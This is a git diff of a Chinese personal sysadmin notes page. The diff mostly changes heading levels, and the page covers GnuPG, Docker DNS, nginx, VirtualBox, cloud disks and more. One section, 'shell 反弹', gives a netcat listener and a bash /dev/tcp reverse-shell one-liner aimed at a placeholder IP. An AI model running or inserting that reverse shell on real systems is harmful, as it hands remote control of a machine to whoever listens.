@@ -3,40 +3,40 @@
 
 &lt;!--more--&gt;
 
-# GnuPG 加密与解密  
-## gpg 对称加密  
-加密:  `gpg -c &lt;file&gt;`， 输入两次加密密码，完成后生成文件`&lt;file&gt;.gpg`(加密后源文件保留)  
-解密:  `gpg &lt;file&gt;.gpg`, 输入加密密码,正确后生成文件`&lt;file&gt;`(解密后加密文件保留)  
-## gpg 非对称加密  
-非对称加密/解密文件时，`Server` 生成私钥与公钥，并把公钥发送给`Client`, `Client` 使用公钥加密数据，并把加密后的数据传给`Server` ，`Server` 最后使用自己的私钥解密数据。  
+## GnuPG 加密与解密  
+### gpg 对称加密  
+- 加密:  `gpg -c &lt;file&gt;`， 输入两次加密密码，完成后生成文件`&lt;file&gt;.gpg`(加密后源文件保留)  
+- 解密:  `gpg &lt;file&gt;.gpg`, 输入加密密码,正确后生成文件`&lt;file&gt;`(解密后加密文件保留)  
+### gpg 非对称加密  
+- 非对称加密/解密文件时，`Server` 生成私钥与公钥，并把公钥发送给`Client`, `Client` 使用公钥加密数据，并把加密后的数据传给`Server` ，`Server` 最后使用自己的私钥解密数据。  
 
-```bash 
-# Server: 创建公钥私钥
-$&gt; gpg --gen-key   # 需要填写一些东西，可根据需求选择 
-## 配置文件介绍
-# GPG 配置文件目录:~/.gnupg
-# ~/.gnupg/gpg.conf – 配置文件
-# ~/.gnupg/trustdb.gpg – 信任库
-# ~/.gnupg/pubring.gpg – 公钥库
-# ~/.gnupg/secring.gpg – 私钥库 
+    ```bash 
+    # Server: 创建公钥私钥
+    $&gt; gpg --gen-key   # 需要填写一些东西，可根据需求选择 
+    ## 配置文件介绍
+    # GPG 配置文件目录:~/.gnupg
+    # ~/.gnupg/gpg.conf – 配置文件
+    # ~/.gnupg/trustdb.gpg – 信任库
+    # ~/.gnupg/pubring.gpg – 公钥库
+    # ~/.gnupg/secring.gpg – 私钥库 
 
-$&gt; gpg --list-key  # 密钥查看 
-$&gt; gpg -a --export &lt;UserID&gt; &gt; ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 &lt;UserID&gt; 被标记为绝对信任  
-# 将公钥传送到Client上 
+    $&gt; gpg --list-key  # 密钥查看 
+    $&gt; gpg -a --export &lt;UserID&gt; &gt; ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 &lt;UserID&gt; 被标记为绝对信任  
+    # 将公钥传送到Client上 
 
-# Client: 导入 公钥 
-$&gt; gpg --import ./public-key.pub 
+    # Client: 导入 公钥 
+    $&gt; gpg --import ./public-key.pub 
 
-# Client: 文件加密 
-$&gt; gpg -e -r &lt;UserID&gt; &lt;file&gt; 
-&lt;file&gt;.gpg 
-# 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  
-# Server: 文件解密 
-$&gt; gpg -d &lt;file&gt;.gpg 
-&lt;file&gt; 
-```
+    # Client: 文件加密 
+    $&gt; gpg -e -r &lt;UserID&gt; &lt;file&gt; 
+    &lt;file&gt;.gpg 
+    # 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  
+    # Server: 文件解密 
+    $&gt; gpg -d &lt;file&gt;.gpg 
+    &lt;file&gt; 
+    ```
 
-# DOCKER 创建 DNS SERVER
+## DOCKER 创建 DNS SERVER  
 ```bash
 $&gt; vim /data/docker/dns/dnsmasq.conf 
 #dnsmasq config, for a complete example, see:
@@ -58,7 +58,7 @@ $&gt; docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/d
 
 ```
 
-# dotnet 环境搭建 
+## dotnet 环境搭建 
 ```bash
 $&gt; rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
 $&gt; yum install libgdiplus-devel libunwind icu -y 
@@ -71,7 +71,7 @@ yum install supervisor -y
 /usr/lib/python2.7/site-packages/supervisor/ui/status.html
 ```
 
-# 在Linux中删除virbr0接口
+## 在Linux中删除virbr0接口
 `virbr0`是`CentOS7`在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的
 ```bash
 $&gt; virsh net-list 
@@ -80,7 +80,7 @@ $&gt; virsh net-undefine default
 $&gt; systemctl restart libvirtd.service
 ```
 
-# Linux 杀毒软件 clamav 
+## Linux 杀毒软件 clamav 
 ```bash
 # 需要安装epel源
 $&gt;　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
@@ -92,7 +92,7 @@ $&gt; clamscan -ri /data --remove  -l /var/log/clamscan.log
 
 ```
 
-# linux 合并文件系统 margerfs 
+## linux 合并文件系统 margerfs 
 &gt;[https://wzyboy.im/post/1148.html](https://wzyboy.im/post/1148.html)
 
 &gt;[https://github.com/trapexit/mergerfs](https://github.com/trapexit/mergerfs)  
@@ -109,7 +109,7 @@ $&gt; /etc/fstab
 
 ```
 
-# linux sftp 搭建  
+## linux sftp 搭建  
 ```bash
 # 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)
 # 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议
@@ -127,13 +127,13 @@ Match Group/User  www                          # 限制某个组或者某个用�
     AllowTcpForwarding no
 ```
 
-# 监听本地网卡上没有的IP地址
+## 监听本地网卡上没有的IP地址
 ```bash
 # 一般用于 keepalive &#43; nginx 使用
 echo &#39;net.ipv4.ip_nonlocal_bind = 1&#39; &gt;&gt; /etc/sysctl.conf
 ```
 
-# 腾讯云第二块网卡绑定公网ip
+## 腾讯云第二块网卡绑定公网ip
 官方文档是有记录的，这儿记录下服务器上的设置  
 ```bash
 # 网卡初始化
@@ -155,7 +155,7 @@ echo &#34;20 t2&#34; &gt;&gt; /etc/iproute2/rt_tables
 /usr/sbin/ip rule add from 172.21.2.74 table 20
 ```
 
-# shell 反弹 
+## shell 反弹 
 &gt; https://blog.csdn.net/weixin_41082546/article/details/104123131  
 
 
@@ -166,7 +166,7 @@ nc -lvp 65535
 bash -i &gt;&amp; /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;&amp;1
 ```
 
-# nginx 获取cdn真实用户ip 
+## nginx 获取cdn真实用户ip 
 ```conf
 # client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
     map $http_x_forwarded_for $client_real_ip {
@@ -176,7 +176,7 @@ bash -i &gt;&amp; /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;&amp;1
     }
 ```
 
-# virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 
+## virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 
 此次问题实际出现是在`windows`上, 理论上说`linux`下若使用`nat`功能可能也会出现该问题(至于为什么用`nat`,`virtualbox`似乎并不支持桥接网卡,因此要为虚拟机分配物理`ip`似乎就只能在物理机绑定多个`ip`,然后`nat`转发到虚拟机中), `virtualbox`在转发`80`端口时似乎会与物理机的`80`冲突,从而导致转发无效,这个可能是因为我物理机也启用了`IIS`的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.
 - 解决方案
  1. 我是用的 `windows`的端口转发解决的, `virtualbox`在`nat`的时候转发一个其他端口(比如`8080`)到内部的`80`, 然后在`windows` 在进行一次转发,将绑定的`ip`的`80`端口转发到`8080`上,这样也可以解决,骚操作看 [`windows命令收集`-`端口转发`](/2022/命令收集/#3-windows-端口转发)
@@ -185,7 +185,7 @@ bash -i &gt;&amp; /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;&amp;1
  &gt; [https://www.coder.work/article/6503907](https://www.coder.work/article/6503907)
 
 
-# 服务器默认端口优化 
+## 服务器默认端口优化   
 1. 检查所有非22开启的端口：`netstat -lntp`  
 ```bash
 $&gt; netstat -lntp
@@ -219,10 +219,10 @@ $&gt; systemctl stop postfix.service rpcbind.service rpcbind.socket     # 关闭
 $&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁用开机启动
 ```
 
-# linux 下hosts文件和dns服务器的响应顺序
+## linux 下hosts文件和dns服务器的响应顺序
 - 通过修改 `/etc/nsswitch.conf` 进行更换 , 更换`/etc/nsswitch.conf: 86`中的`files`和`dns`的顺序即可  
 
-# git 提交类型 
+## git 提交类型 
 
 | 类型       | 描述                                                        |
 | :--------- | :---------------------------------------------------------- |
@@ -237,7 +237,7 @@ $&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁
 | `revert`   | 回滚到上一个版本                                            |
 
 
-# linux 通过s3fs挂载七牛云存储
+## linux 通过s3fs挂载七牛云存储
 ```bash
 $&gt; sudo yum install epel-release
 $&gt; sudo yum install s3fs-fuse
@@ -249,19 +249,19 @@ $&gt; s3fs s3空间名 /mnt/s3fs -o passwd_file=/mnt/.passwd-s3fs -o url=http://
 
 ```
 
-# 普通用户校验是否有权限通过docker.sock操作 docker
+## 普通用户校验是否有权限通过docker.sock操作 docker
 ```
 sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping
 ```
 
-# rdesktop 远程桌面工具安装
+## rdesktop 远程桌面工具安装
 - rdesktop 用于linux下的rdp工具，还是非常好用的 
 ```
 $&gt; sudo dnf install rdesktop
 $&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator &lt;server_ip&gt;:&lt;port&gt; -p&lt;password&gt;
 ```
 
-# Umask 计算方法 
+## Umask 计算方法 
 - 当创建目录时候，`目录创建后的权限` =  `默认目录最大权限(777)` - `umask 权限`  
     - `umask=0022 --&gt; 777 - 022 = 755(目录权限)`  
 - 当创建文件时候，若`umask`值所有位数为偶数，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限`  
@@ -270,16 +270,16 @@ $&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/t
     - `umask = 0045 --&gt; 666 - 045 = (621 &#43; 001) = 622`  
     - `umask = 0033 --&gt; 666 - 033 = (633 &#43; 011) = 644`  
 
-# 输入输出重定向  
+## 输入输出重定向  
 
-## 文件描述符    
+### 文件描述符    
 |文件描述符|文件名|类型|硬件|
 |-|-|-|-|
 |`0`|`stdin`|标准输入文件|键盘|
 |`1`|`stdout`|标准输出文件|显示器|
 |`2`|`stderr`|标准错误输出文件|显示器|
 
-## 标准重定向 
+### 标准重定向 
 &gt;[https://aimuke.github.io/linux/2019/05/29/redirect/](https://aimuke.github.io/linux/2019/05/29/redirect/)  
 
 |类型|表现形式|
@@ -293,7 +293,7 @@ $&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/t
 |标准错误重定向到标准输出|`2&gt;&amp;1`，`(cmd &gt; /dev/null 2&gt;&amp;1) == (cmd &gt;&amp; /dev/null) == (cmd &amp;&gt; /dev/null)`|
 
 
-# linux 下挂载 esxi 的 vmfs 文件系统 
+## linux 下挂载 esxi 的 vmfs 文件系统 
 `vmfs` 是`esxi`的文件系统,物理机使用`esxi`虚拟化后硬盘的文件格式就是这个. `linux`下可以直接将其挂在到本地
 `vmfs-tools`是`linux`挂载`vmfs`的驱动程序(应该也可以挂在`vmdk`文件,*我没有试过*),默认在`ubuntu`上已获得支持,`fedora`上可以直接将`ubuntu`上的安装程序复制过来也可以直接使用. 
 
@@ -304,7 +304,7 @@ $&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/t
 vmfs-fuse /dev/sdc1 /mnt/sdc 
 ```
 
-# cp mv 进度条补丁
+## cp mv 进度条补丁
 ```bash
 # 注意尽量不要使用 root 用户操作
 # 下载coreutils
@@ -329,7 +329,7 @@ $ sudo cp src/cp /usr/local/bin/cp
 $ sudo cp src/mv /usr/local/bin/mv
 ```
 
-# 更改docker容器中的时间而不影响宿主机 
+## 更改docker容器中的时间而不影响宿主机 
 ```bash
 $&gt; git clone https://github.com/wolfcw/libfaketime.git
 $&gt; cd libfaketime
@@ -344,13 +344,13 @@ $&gt;&gt; export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=&#34;&#43;2d&#34;
 $&gt;&gt; export LD_PRELOAD=
 ```
 
-# ubuntu/debian切换shell（dash/bash）
+## ubuntu/debian切换shell（dash/bash）
 ```bash
 $&gt; dpkg-reconfigure dash
 # 弹出窗口选择 &lt;No&gt;
 ```
 
-# openvpn 指定路由配置 
+## openvpn 指定路由配置 
 &gt; https://blog.csdn.net/joshua317/article/details/120245443  
 ```bash
 # 在 verb 3 下添加
@@ -360,7 +360,7 @@ route 172.16.0.0 255.255.0.0  vpn_gateway
 route 140.143.61.12 255.255.255.255  vpn_gateway
 ```
 
-# svg 背景透明图片
+## svg 背景透明图片
 ```xml
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?&gt;
 &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;
@@ -370,7 +370,7 @@ route 140.143.61.12 255.255.255.255  vpn_gateway
 &lt;/svg&gt;
 ```
 
-# CentOS 启用zram(服务器内存过低，可用于替代swap)
+## CentOS 启用zram(服务器内存过低，可用于替代swap)
 &gt; [https://fedoraproject.org/wiki/Changes/SwapOnZRAM](https://fedoraproject.org/wiki/Changes/SwapOnZRAM)   
 ```bash
 # 加载内核模块 
@@ -405,7 +405,7 @@ echo &#34;512M&#34; | sudo tee /sys/block/zram0/disksize
 echo &#34;lzo&#34; | sudo tee /sys/block/zram0/comp_algorithm
 
 ```
-# virtualbox NAT端口映射配置
+## virtualbox NAT端口映射配置
 `windows` 和 `linux`命令应一致(只测试过`windows`)，用于快速批量映射
 ```shell
 # VBoxManage natnetwork modify --netname &#34;10.0.2.0/24&#34; --port-forward-4 &#34;名称:协议:[主机ip]:主机端口:[虚拟机ip]:虚拟机端口&#34;
@@ -440,7 +440,7 @@ certutil -A -n &#34;GeoTrust SSL CA - G3&#34; -t &#34;Pu,Pu,Pu&#34; -d ./ -i qq.
 Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选择“Advanced”（高级选项）标签页，在“Update Site”下拉列表中添加上述地址，并单击“Apply”（应用）按钮即可
 ```
 
-# /etc/sysconfig/network-scripts 为空
+## /etc/sysconfig/network-scripts 为空
 - 本来 `/etc/sysconfig/network-scripts` 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是`NetworkManager`，他会自动管理网卡，而由他管理的话，那么就可能不再需要`/etc/sysconfig/network-scripts/`下的配置文件了。他的默认配置文件是在`/etc/NetworkManager/system-connections`下
 - 如何继续使用`/etc/sysconfig/network-scripts`下的配置文件来继续管理网卡呢
 ```bash
@@ -460,13 +460,13 @@ wifi.scan-rand-mac-address=no
 # 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。
 ```
 
-# 双网卡优先级配置  
+## 双网卡优先级配置  
 - 网卡配置文件中 添加`IPV4_ROUTE_METRIC`参数，值越低，优先级越高
 
-# 网卡连接后执行某个脚本  
+## 网卡连接后执行某个脚本  
 - 脚本存放位置: `/etc/NetworkManager/dispatcher.d`
 
-# 网卡配置文件固定路由设置 
+## 网卡配置文件固定路由设置 
 1. 关闭网卡自动路由功能
 ```bash
 # /etc/sysconfig/network-scripts/ifcfg-enp0s31f6
@@ -480,10 +480,10 @@ NETMASK0=255.255.0.0 # 子网掩码
 GATEWAY0=&lt;172.16.31.1&gt; 
 ```
 
-# acme.sh 证书安装 `--reloadcmd`无效问题
+## acme.sh 证书安装 `--reloadcmd`无效问题
 一般来说，我们在使用自动续签证书的时候，需要让`acme.sh`更新证书后自动重载一下`nginx`,但是我们的`nginx`基本都是自编译的，所以得使用`acme.sh`的`--reloadcmd`参数，但实际上在初始化时候如果你没有指定`--reloadcmd`,那么第一次部署后即使你在更新的自动任务中添加`--reloadcmd`也是无效的，这个时候可以直接修改配置证书的配置文件`/root/.acme.sh/example.com/example.com.conf`，在里面添加一行`Le_ReloadCmd=&#39;/usr/bin/systemctl restart nginx.service&#39;`就可以了。当然，也可以在初始安装证书的时候添加`--reloadcmd`参数，他会给你自动加入这个参数到配置文件中.
 
-# openai api接口反向代理实现国内直接使用
+## openai api接口反向代理实现国内直接使用
 - `nginx` 反向代理设置(仅示例) 
     ```conf
     server {
@@ -590,7 +590,7 @@ GATEWAY0=&lt;172.16.31.1&gt;
 
 
 
-# 云安全组配置规范 
+## 云安全组配置规范 
 不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试)
 
 云策略规则部署规范(以阿里云为例)
@@ -603,10 +603,10 @@ GATEWAY0=&lt;172.16.31.1&gt;
 1. 建议每个受信组单独建立一个安全组，方便管理。
 2. 建议配合云策略和服务器防火墙共同使用。
 
-# webmin 密码修改 
+## webmin 密码修改 
 - `/usr/libexec/webmin/changepass.pl /etc/webmin &lt;user&gt; &lt;passwd&gt;` 
 
-# 记录一个nginx 反代规则
+## 记录一个nginx 反代规则
 ```sh
 # 请求 以 /example 开头的uri，反向代理到 http://127.0.0.1:8081/example 下
 
@@ -618,14 +618,14 @@ location ~ ^/example($|/) {
 
 ```
 
-# debian pull 镜像 408 错误
+## debian pull 镜像 408 错误
 ```bash
 # 不知道原因,解决方案如下
 # 参考地址: https://stackoverflow.com/questions/38386809/docker-error-http-408-response-body-invalid-character-looking-for-beginnin
 sudo ip link set dev eth0 mtu 1450
 ```
 
-# 在bash脚本中使用别名(alias)的方式
+## 在bash脚本中使用别名(alias)的方式
 ```bash
 # 打开alias支持
 shopt -s expand_aliases
@@ -837,7 +837,7 @@ $&gt; sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus    #
     - 为每一个`cdn`备用域名添加一个独立的`cdn` 
 
 
-# 亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)
+## 亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)
 ```bash
 ### https://docs.aws.amazon.com/zh_cn/ebs/latest/userguide/recognize-expanded-volume-linux.html
 
@@ -856,7 +856,7 @@ $&gt; sudo xfs_growfs -d /
 $&gt; sudo resize2fs /dev/nvme0n1p1
 ```
 
-# 亚马逊加速器配置
+## 亚马逊加速器配置
 &gt; https://docs.aws.amazon.com/zh_cn/global-accelerator/latest/dg/what-is-global-accelerator.html  
 
 `AWS Global Accelerator`可以提高全球受众使用的 `Internet` 应用程序的可用性。使用标准加速器，全球加速器将 `AWS` 全球网络的流量引导到离客户端最近的区域中的终端节点。 本节主要说明`标准加速`   
@@ -872,7 +872,7 @@ $&gt; sudo resize2fs /dev/nvme0n1p1
  
 `AWS Global Accelerator`的功能和`cdn`类似，但效果比`cdn`好, 费用肯定要更高一些了。他还可以实现端口转发等其他的功能，可以自行参悟。
 
-# 阿里云磁盘分区扩容
+## 阿里云磁盘分区扩容
 
 &gt; https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1  
 
@@ -901,11 +901,11 @@ $&gt; sudo resize2fs /dev/vdc
 ```
 
 
-# 网络故障记录
+## 网络故障记录
 - `症状`：局域网机器网络故障，时好时坏。故障时候无法`ping`通网关(无法获取响应)，但可以`ping`通同网段的其他主机，也可以与其他主机正常通信。
 - `原因`：当前主机是通过手动配置`ip`，而局域网`ip`是路由自动分配的，有其他同事在连接时候占用了当前主机配置的`ip`，从而`ip`重复导致了上诉问题。
 
-# linux 桌面环境下，绑定指定唤起协议
+## linux 桌面环境下，绑定指定唤起协议
 - 例如 `mailto://` 唤起指定的邮件应用,下面以`he3`的`appimage`程序为例
 ```bash
 # 创建一个desktop文件(~/.local/share/applications)
@@ -933,7 +933,7 @@ $&gt; xdg-mime default appimagekit-he3.desktop x-scheme-handler/he3
 $&gt; xdg-mime query default x-scheme-handler/he3
 ```
 
-# 解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题) 
+## 解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题) 
 
 **此方案只适合`linux`桌面系统，`windows`理论可参考设定**  
 ```bash
@@ -985,10 +985,10 @@ $&gt; sudo iptables -A FORWARD -i br-vbox0 -o wlp0s20f3 -j ACCEPT
 $&gt; sudo iptables -A FORWARD -i wlp0s20f3 -o br-vbox0 -m state --state RELATED,ESTABLISHED -j ACCEPT
 ```
 
-# grafana 查询错误 `[A] got error: input data must be a wide series but got type long (input refid)`
+## grafana 查询错误 `[A] got error: input data must be a wide series but got type long (input refid)`
 - 这个问题是在配置`grafana`警报规则时出现的，实际上这儿添加的是表达式，而不是查询标签，统计出来的结果只能是数字(看看`prometheus`的`graph`面板 )
 
-# 通过yum安装的mysql进行升级的时候报错 `xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql` 
+## 通过yum安装的mysql进行升级的时候报错 `xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql` 
 这个错误多数出现在yum安装 `mysql5.6`、`5.7` 时  
 问题:  
 ```bash
@@ -1008,7 +1008,7 @@ GPG Keys are configured as: file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql
 $&gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
 ```
 
-# nginx配置特定方法请求时进行密码认证
+## nginx配置特定方法请求时进行密码认证
 ```ini
     # location  
     auth_basic &#34;Registry realm&#34;;
@@ -1020,13 +1020,13 @@ $&gt; rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
     }
 ```
 
-# 服务器资源不够导致的问题
+## 服务器资源不够导致的问题
 &amp;emsp;&amp;emsp; 由于服务器上的`php`站点经常受到攻击，于是决定重新调整环境架构，给上个开源`waf`，部署一切正常，但是在站点正式运行的时，某个站点在访问一个查询页面时候，数据库的`cpu`使用率消耗疯狂上涨(几百倍)，开始以为是站点被传木马了，一直疯狂查代码，查了很久发现，结果是服务器资源不够，停了一些站点重新分配了下每个容器的资源使用后，目前看起来稳定了，2核8G内存跑了近60个`php`站点，不知道这是个什么水准的服务器，还是我太水优化不了😂😂😂。
 
-# 通过`systemd`服务配置文件修改进程优先级
+## 通过`systemd`服务配置文件修改进程优先级
 &amp;emsp;&amp;emsp; 在`[Service]` 下添加 `Nice=-10`。 `Nice` 进程优先级，`-20`-`19`, 数字越小，优先级越高。 还可以直接修改已启动的进程的优先级 `sudo renice -n -10 -p &lt;pid&gt;`。可以通过`sudo nice -n -10 &lt;command&gt;` 直接在启动时指定 
 
-# git 删除最近几次提交记录 
+## git 删除最近几次提交记录 
 ```bash
 # 重置到指定提交 
 $&gt;  git reset --hard &lt;commit id&gt;
